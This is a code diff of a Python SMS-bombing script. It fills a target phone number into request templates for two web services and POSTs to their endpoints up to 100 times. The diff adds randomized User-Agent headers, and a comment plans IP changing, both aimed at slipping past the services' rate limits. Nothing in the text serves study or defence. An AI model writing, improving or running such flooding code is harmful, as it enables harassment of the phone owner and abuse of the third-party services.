@@ -12,11 +12,6 @@ range_n_limit = 100
 cunt = 0
 services = ['rirabook', 'doctoreto']
 
-# +_+_+_+ User Agent Generator +_+_+_+
-# ua = UserAgent()
-# user_agent = ua.random
-# print(user_agent)
-
 
 def validate_phone_number(phone_number):
     pattern = r'^09\d{9}$'
@@ -35,7 +30,7 @@ def send(phone_number, range_n):  # add prvity Change IP
         return
 
     # Load lib/API/sms.json
-    with open('./API/sms.json') as json_file:
+    with open('./lib/API/sms.json') as json_file:
         data = json.load(json_file)
 
         # Replace phone number in data
@@ -43,9 +38,12 @@ def send(phone_number, range_n):  # add prvity Change IP
         rep_data = rep_data.replace('numnum', phone_number)
         print(phone_number)
 
-    if range_n <= range_n_limit:
-        for i in range(1, range_n + 1):
+    if int(range_n) <= range_n_limit:
+        for i in range(1, int(range_n) + 1):
             cunt = i
+            # +_+_+_+ User Agent Generator +_+_+_+
+            ua = UserAgent()
+            headers = {'User-Agent': ua.random}
             for service in services:
                 # convert service list to str
                 service_name = str(service)
@@ -57,7 +55,7 @@ def send(phone_number, range_n):  # add prvity Change IP
                 url = url_data['url']
                 req_data = url_data['data']
 
-                req = requests.post(url=url, data=req_data)
+                req = requests.post(url=url, data=req_data, headers=headers)
                 print(req, cunt)
     else:
         print('Send Range Limit 100')
